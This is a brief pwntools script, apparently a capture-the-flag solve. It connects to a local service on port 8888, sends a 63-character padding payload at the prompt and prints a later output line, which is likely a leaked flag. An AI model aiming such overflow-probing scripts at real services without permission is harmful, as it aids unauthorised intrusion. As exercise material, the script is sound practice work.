#!/usr/bin/env python3

from pwn import *

r = connect("0.0.0.0", 8888)

r.recvuntil(b"> ")

payload = 'a' * 63

r.sendline(str.encode(payload))

r.recvline()
r.recvline()
r.recvline()

print(r.recvline())
